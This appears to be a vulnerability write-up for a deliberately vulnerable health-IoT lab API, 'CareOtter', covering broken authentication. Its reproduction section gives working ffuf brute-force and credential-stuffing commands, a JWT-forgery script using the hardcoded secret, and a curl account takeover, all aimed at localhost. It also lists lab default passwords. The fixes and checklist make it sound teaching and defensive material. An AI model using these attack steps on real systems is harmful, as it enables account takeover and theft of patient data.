---
id: API-02
title: "Broken Authentication"
category: API
status: COMPLETADA
severity: High
owasp: "API2:2023 — Broken Authentication"
cwe: "CWE-287 (Improper Authentication) / CWE-308 (Use of Single-factor Authentication) / CWE-759 (Use of a One-Way Hash without a Salt)"
source_docs:
  - "CareOtter_API.md Vulnerability Surface"
affected_components:
  - "cloud_api/careotter/api_server/app.py"
  - "cloud_api/careotter/api_server/core/jwt_service.py"
  - "cloud_api/careotter/api_server/core/decorators.py"
  - "cloud_api/careotter/api_server/services/database_service.py"
  - "cloud_api/careotter/api_server/config.py"
verified_date: "2026-05-20"
---

# API-02 — Broken Authentication

> **Status:** ✅ DONE  
> **Source docs:** `CareOtter_API.md` Vulnerability Surface  
> **OWASP:** API2:2023 — Broken Authentication  
> **CWE:** CWE-287 (Improper Authentication) / CWE-308 (Use of Single-factor Authentication) / CWE-759 (Use of a One-Way Hash without a Salt)  
> **Severity:** High

---

## Why It Matters

**Broken Authentication** covers any weakness that allows an attacker to compromise tokens, credentials, or session identifiers, or to impersonate other users. In CareOtter, authentication flaws span the entire stack: from password storage and JWT signing secrets to unprotected administrative endpoints and missing rate limits on login.

The impact is severe because:
- Patient vitals are **Protected Health Information (PHI)**. Any authentication bypass grants access to cardiac telemetry, clinical alerts, and device MAC addresses.
- The device registration endpoint allows **account takeover** by overwriting existing patient and admin credentials without authentication.
- Weak password hashing (unsalted SHA-256) means a leaked database can be cracked offline in seconds with rainbow tables or GPU-accelerated hashcat.
- The hardcoded JWT secret allows an attacker to forge valid tokens for any role (patient, caregiver, admin) without ever knowing a password.

---

## Root Cause

### 1. Login endpoints lack brute-force protection

The three login endpoints accept unlimited requests with no rate limiting, account lockout, CAPTCHA, or exponential backoff:

```python
@app.route('/api/auth/login', methods=['POST'])
def login():
    ...
    user = db.verify_user(username, password)
    if not user:
        return jsonify({'error': 'Invalid username or password', 'code': 'AUTH_FAIL'}), 401
    ...

@app.route('/api/auth/login/patient', methods=['POST'])
def login_patient(): ...

@app.route('/api/auth/login/caregiver', methods=['POST'])
def login_caregiver(): ...
```

**MISSING:**
- No per-IP or per-account rate limiting
- No account lockout after N failed attempts
- No delay or CAPTCHA mechanism
- Error messages are constant-time but the endpoint itself is callable at line rate

### 2. Weak password storage (unsalted SHA-256)

`database_service.py` hashes passwords with raw SHA-256 and no salt:

```python
def _hash_password(self, password: str) -> str:
    """Simple SHA-256 hash for lab purposes (not production-safe)."""
    return hashlib.sha256(password.encode('utf-8')).hexdigest()
```

**Consequences:**
- Identical passwords produce identical hashes → trivial to detect password reuse across accounts.
- Rainbow tables for 8-character alphanumeric passwords fit in modern GPU memory.
- No work factor (unlike bcrypt/Argon2) — an RTX 4090 can test billions of SHA-256 hashes per second.

### 3. Hardcoded weak JWT secret

`config.py` defines a predictable default secret:

```python
JWT_SECRET = os.getenv('JWT_SECRET', 'careotter_jwt_2026')
```

`jwt_service.py` uses this secret for HS256 signing:

```python
token = jwt.encode(payload, Config.JWT_SECRET, algorithm=Config.JWT_ALGORITHM)
```

**Consequences:**
- An attacker who reads the source code (or extracts the secret from the container/environment) can forge tokens for any username and role.
- The `decode_token()` method does reject expired and invalid-signature tokens, but the secret entropy is too low to resist offline cracking if the key ever leaks.

### 4. Device registration endpoint requires no authentication

`POST /admin/device/register` accepts a device signature, MAC, and user credentials with **no authentication**:

```python
@app.route('/admin/device/register', methods=['POST'])
def device_register():
    data = request.get_json(force=True, silent=True) or {}
    signature = data.get('signature', '')
    mac = data.get('mac', '').upper()
    device_ip = data.get('device_ip', '')
    patient = data.get('patient', {})
    admin = data.get('admin', {})
    ...
    ok = db.register_device_with_signature(
        mac=mac, signature=signature,
        patient_username=patient.get('username', ''),
        patient_password=patient.get('password', ''),
        admin_username=admin.get('username', ''),
        admin_password=admin.get('password', ''),
        device_ip=device_ip, device_name='CareOtter_HR'
    )
```

**Consequences:**
- The signature is hardcoded and identical across all devices (`EXPECTED_DEVICE_SIGNATURE = "9C0C306DEF2A"`).
- Any attacker who knows the signature can register a rogue device.
- More critically, `register_device_with_signature` calls `create_or_update_user` for both patient and admin accounts, **overwriting existing passwords** without any authorization check.

### 5. Sensitive operations without password confirmation

Multiple endpoints perform security-critical actions without requiring the user's current password:

| Endpoint | Action | Password confirmation? |
|----------|--------|------------------------|
| `DELETE /api/devices/me` | Unregister patient's device | ❌ No |
| `POST /api/patient/caregivers` | Assign a caregiver | ❌ No |
| `DELETE /api/patient/caregivers/<username>` | Remove a caregiver | ❌ No |
| `POST /api/network/wifi` | Change device WiFi credentials | ❌ No |
| `POST /api/config/thresholds` | Modify clinical alert thresholds | ❌ No |
| `POST /api/services/restart` | Restart device services | ❌ No |

### 6. `/initialize_iot` exposes plaintext credentials

The bootstrap endpoint returns default passwords in the response body:

```json
{
  "admin": {"username": "admin", "password": "CareOtter2026!"},
  "patient": {"username": "john_doe", "password": "johnny123"},
  "caregiver": {"username": "care_john", "password": "Caregiver2026!"}
}
```

This endpoint is **unauthenticated** and callable by anyone who can reach the Cloud API. In `VULNERABLE=1` mode it even auto-executes at startup, leaving the system in a known weak state.

---

## Affected Endpoints & Components

### Authentication

| Method | Endpoint | Issue |
|--------|----------|-------|
| `POST` | `/api/auth/login` | No rate limiting — brute force / credential stuffing |
| `POST` | `/api/auth/login/patient` | No rate limiting — brute force |
| `POST` | `/api/auth/login/caregiver` | No rate limiting — brute force |

### Device Registration (No Auth Required)

| Method | Endpoint | Issue |
|--------|----------|-------|
| `POST` | `/admin/device/register` | No auth + hardcoded signature → account takeover |
| `GET` | `/initialize_iot` | Returns plaintext passwords; auto-runs in vuln mode |

### Sensitive Operations (No Re-Auth)

| Method | Endpoint | Issue |
|--------|----------|-------|
| `DELETE` | `/api/devices/me` | Unregister device without password confirmation |
| `POST` | `/api/patient/caregivers` | Add caregiver without password confirmation |
| `DELETE` | `/api/patient/caregivers/<username>` | Remove caregiver without password confirmation |
| `POST` | `/api/network/wifi` | Change WiFi config without password confirmation |
| `POST` | `/api/config/thresholds` | Change clinical thresholds without password confirmation |
| `POST` | `/api/services/restart` | Restart services without password confirmation |

### Password Storage

| Component | Issue |
|-----------|-------|
| `database_service.py` `_hash_password()` | SHA-256 without salt |
| `database_service.py` `create_or_update_user()` | Overwrites passwords without old-password check |

### Token Security

| Component | Issue |
|-----------|-------|
| `config.py` `JWT_SECRET` | Hardcoded weak default (`careotter_jwt_2026`) |
| `jwt_service.py` `decode_token()` | Distinguishes expired vs invalid signature (information leak) |

---

## Steps to Reproduce

### 1. Credential stuffing / brute force on login

The login endpoints (`/api/auth/login`, `/api/auth/login/patient`, `/api/auth/login/caregiver`) enforce **no rate limiting, account lockout, or CAPTCHA**. This allows both credential-stuffing attacks (known user + password list) and horizontal brute-force attacks (password list against a single account).

#### Prerequisites — prepare wordlists

```bash
# Known / seeded usernames in the lab
cat > users.txt << 'EOF'
admin
john_doe
care_john
alice_g67
genuinebob49
EOF

# Common weak passwords (tailor to your target wordlist)
cat > passwords.txt << 'EOF'
admin
123456
password
johnny123
CareOtter2026!
Caregiver2026!
Aliceisthebest!
spongebob1
EOF
```

---

#### Option A — ffuf (recommended for REST APIs)

`ffuf` is a fast web fuzzer written in Go. It supports **clusterbomb** mode to iterate every user against every password (Cartesian product), which is ideal for credential stuffing.

> **⚠️ Important:** CareOtter runs on Flask's **development server** (Werkzeug). It is single-threaded with a very small connection backlog. If you launch ffuf with many threads (e.g. `-t 40`), Werkzeug will start rejecting connections with `Connection refused`. ffuf marks these as errors and skips those lines, so you may **miss the correct password** entirely. Always use **low concurrency** (`-t 1` or `-t 2`) against this target.

##### Single-account brute force (one wordlist)

```bash
ffuf -u http://localhost:5002/api/auth/login/patient \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"john_doe","password":"FUZZ"}' \
  -w passwords.txt \
  -mr "token" \
  -mc all \
  -t 1
```

![[API-02-brute_force_john_doe.png]]
##### Credential stuffing (two wordlists)

```bash
ffuf -u http://localhost:5002/api/auth/login \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"FUZZ","password":"FUZ2Z"}' \
  -w users.txt:FUZZ \
  -w passwords.txt:FUZ2Z \
  -mode clusterbomb \
  -mr "token" \
  -mc all \
  -t 1
```

**What the flags do:**
| Flag | Meaning |
|------|---------|
| `-mode clusterbomb` | Test every user against every password (m × n combinations) |
| `-mr "token"` | **Match** responses that contain the string `token` (success indicator) |
| `-mc all` | Do not hide responses by HTTP status code — let `-mr` drive filtering |
| `-t 1` | **Single thread** — required because Werkzeug's dev server drops connections under load |
| `FUZZ` / `FUZ2Z` | Placeholders replaced by the first and second wordlist respectively |

**Sample output on success:**
```
[Status: 200, Size: 312, Words: 12, Lines: 1]
    * FUZZ: john_doe
    * FUZ2Z: johnny123
```

---

#### Lab Note — Werkzeug connection backlog limitation

CareOtter uses Flask's built-in development server (`Werkzeug`), which is **not designed for concurrent load**. Its TCP listen backlog is very small (typically 128 or less), and it handles requests with a single-threaded or very small thread-pool model.

When you launch ffuf/wfuzz with high concurrency (e.g. `-t 40`), the server starts rejecting connections with `Connection refused`. The fuzzer marks those lines as errors, skips them, and advances the counter — which explains the "jumping" behavior you observed (e.g. progress going from 800 to 20000 instantly). The requests that were skipped **never reached the application**, so if the correct password was among them, the attack will fail silently.

**Mitigation:** Always use **single-threaded mode** (`-t 1` in ffuf, `-t 1` in wfuzz) or a sequential bash loop. The server can sustain ~300-500 req/s sequentially without errors, which is more than fast enough for lab-sized wordlists.

**Verification:**

```bash
# This works — sequential, 0 errors, finds the password
ffuf -w passwords.txt -u http://localhost:5002/api/auth/login/patient \
  -X POST -H "Content-Type: application/json" \
  -d '{"username":"john_doe","password":"FUZZ"}' \
  -mr "token" -mc all -t 1

# This fails — high concurrency, ~95% connection errors, misses the password
ffuf -w passwords.txt -u http://localhost:5002/api/auth/login/patient \
  -X POST -H "Content-Type: application/json" \
  -d '{"username":"john_doe","password":"FUZZ"}' \
  -mr "token" -mc all -t 40
```

> **Is this an API vulnerability?** No — it is not an intentional rate-limit. It is a side effect of running a **development server in production** (API8:2023 — Security Misconfiguration). The endpoint itself has no throttling logic.
>
> **Fix available:** The project now includes a `wsgi.py` entrypoint and a Gunicorn-based `Dockerfile` that replaces Werkzeug with a threaded production server. With Gunicorn (`--workers 1 --threads 4`), the API sustains 1000+ concurrent requests with **zero connection errors** and finds the correct password in under 2 seconds, even with high-concurrency fuzzers (`-t 40`).

### 2. Forge a JWT with the known secret

```bash
# Install python-jwt or use an online HS256 signer
python3 -c "
import jwt, datetime
payload = {
    'sub': 'admin',
    'role': 'admin',
    'iat': datetime.datetime.now(datetime.timezone.utc),
    'exp': datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=24)
}
token = jwt.encode(payload, 'careotter_jwt_2026', algorithm='HS256')
print(token)
"
```

Use the forged token against any `@token_required` or `@web_admin_required` endpoint:

```bash
curl -s -H "Authorization: Bearer <FORGED_TOKEN>" \
  http://localhost:5002/api/devices
```

> **Expected:** `200 OK` — the server accepts the attacker-forged token because the secret is hardcoded and known.

### 3. Account takeover via unauthenticated device registration

```bash
curl -s -X POST http://localhost:5002/admin/device/register \
  -H "Content-Type: application/json" \
  -d '{
    "signature": "9C0C306DEF2A",
    "mac": "DE:AD:BE:EF:00:01",
    "device_ip": "192.168.2.99",
    "patient": {"username": "john_doe", "password": "pwned123"},
    "admin": {"username": "admin", "password": "pwned123"}
  }'
```

> **Expected:** `200 OK` — the patient and admin passwords are silently overwritten to `pwned123`. The attacker now owns both accounts.

### 4. Extract default credentials from `/initialize_iot`

```bash
curl -s http://localhost:5002/initialize_iot | python3 -m json.tool
```

> **Expected:** Response body contains plaintext passwords for admin, patient, and caregiver accounts.

### 5. Perform sensitive operation without password confirmation

```bash
# Obtain a patient JWT
JWT=$(curl -s -X POST http://localhost:5002/api/auth/login/patient \
  -H "Content-Type: application/json" \
  -d '{"username":"john_doe","password":"johnny123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Unregister the device without ever providing the password again
curl -s -X DELETE -H "Authorization: Bearer $JWT" \
  http://localhost:5002/api/devices/me
```

> **Expected:** `200 OK` — device is unregistered with no password confirmation step.

---

## Expected Result

- Login endpoints return `401 AUTH_FAIL` on every wrong attempt but **never block or slow down** the attacker.
- A JWT forged with `careotter_jwt_2026` is accepted as valid by all protected endpoints.
- `POST /admin/device/register` succeeds without any `Authorization` header and overwrites existing user passwords.
- `GET /initialize_iot` returns default passwords in plaintext JSON.
- `DELETE /api/devices/me`, `POST /api/network/wifi`, and other sensitive endpoints succeed with only the JWT cookie/header — no password re-authentication.

---

## How It Should Be

### Rate-limit login attempts

```python
from functools import wraps
from flask import request, jsonify
import time

_login_attempts = {}
LOGIN_MAX_ATTEMPTS = 5
LOGIN_WINDOW = 300  # 5 minutes

def _login_rate_check(key: str) -> tuple[bool, float]:
    now = time.time()
    attempts = _login_attempts.get(key, [])
    attempts = [t for t in attempts if now - t < LOGIN_WINDOW]
    if len(attempts) >= LOGIN_MAX_ATTEMPTS:
        retry_after = LOGIN_WINDOW - (now - attempts[0])
        return False, retry_after
    return True, 0.0

def _login_record_fail(key: str):
    _login_attempts.setdefault(key, []).append(time.time())
```

### Use bcrypt/Argon2 with salt

```python
import bcrypt

def _hash_password(self, password: str) -> str:
    return bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12)).decode()

def verify_user(self, username: str, password: str) -> Optional[dict]:
    user = self.get_user_by_username(username)
    if not user:
        return None
    if bcrypt.checkpw(password.encode(), user['password_hash'].encode()):
        return { ... }
    return None
```

### Load JWT secret from environment (no hardcoded default)

```python
JWT_SECRET = os.environ['JWT_SECRET']  # Fail at startup if missing
```

### Require authentication on device registration

```python
@app.route('/admin/device/register', methods=['POST'])
@token_required
def device_register():
    if g.current_user.get('role') != 'admin':
        return jsonify({'error': 'Admin required'}), 403
    ...
```

### Require password confirmation for sensitive operations

```python
# Example pattern for DELETE /api/devices/me
current_password = data.get('current_password', '')
if not db.verify_user(username, current_password):
    return jsonify({'error': 'Current password required'}), 403
```

### Remove or protect `/initialize_iot`

```python
@app.route('/initialize_iot', methods=['POST'])  # Not GET
def initialize_iot():
    # Require a strong bootstrap token from environment
    bootstrap_token = request.headers.get('X-Bootstrap-Token', '')
    if not secrets.compare_digest(bootstrap_token, os.environ.get('BOOTSTRAP_TOKEN', '')):
        return jsonify({'error': 'Forbidden'}), 403
    ...
```

---

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Authentication | Per-IP + per-account rate limiting on login (5 attempts / 5 min) | Stop credential stuffing and brute force |
| Authentication | Account lockout after N consecutive failures | Slow down targeted attacks |
| Authentication | CAPTCHA after 3 failed attempts | Distinguish humans from automated tools |
| Storage | Replace SHA-256 with bcrypt/Argon2 + salt | Prevent offline cracking of leaked hashes |
| Storage | Enforce password complexity policy (min 12 chars, mixed case, digits, symbols) | Reduce dictionary attack success rate |
| Token | Load JWT secret exclusively from environment / secret manager | Prevent token forgery from source-code analysis |
| Token | Rotate JWT secrets periodically | Limit window of exposure if a secret leaks |
| Authorization | Protect `/admin/device/register` with `@token_required` + admin role check | Prevent rogue device registration |
| Authorization | Verify current password before overwrite in `create_or_update_user` | Prevent account takeover via device registration |
| Session | Require password re-authentication for sensitive operations (device unregister, WiFi change, password change) | Mitigate session hijacking impact |
| Bootstrap | Remove `/initialize_iot` or protect it with a one-time bootstrap token | Prevent exposure of default credentials |

---

## Verification Checklist

- [ ] `POST /api/auth/login` returns `429 Too Many Requests` after 5 failed attempts within 5 minutes
- [ ] `POST /api/auth/login` returns `Retry-After` header when rate-limited
- [ ] Passwords in the database are stored as bcrypt hashes (not SHA-256 hex strings)
- [ ] `JWT_SECRET` has no hardcoded fallback — startup fails if the environment variable is missing
- [ ] `POST /admin/device/register` returns `401` without a valid admin JWT
- [ ] `POST /admin/device/register` returns `403` with a non-admin JWT
- [ ] `DELETE /api/devices/me` requires `current_password` in the request body
- [ ] `POST /api/network/wifi` requires `current_password` in the request body
- [ ] `GET /initialize_iot` is removed or protected by a strong bootstrap token
- [ ] `jwt_service.py` does not distinguish "expired" vs "invalid signature" in error responses
- [ ] New passwords must pass complexity validation (≥12 chars, mixed case, digit, symbol)

---

## References

- `CareOtter_API.md` Vulnerability Surface
- `cloud_api/careotter/api_server/app.py` (`login`, `login_patient`, `login_caregiver`, `device_register`, `initialize_iot`, `delete_my_device`)
- `cloud_api/careotter/api_server/core/jwt_service.py`
- `cloud_api/careotter/api_server/core/decorators.py`
- `cloud_api/careotter/api_server/services/database_service.py` (`_hash_password`, `verify_user`, `register_device_with_signature`)
- `cloud_api/careotter/api_server/config.py`
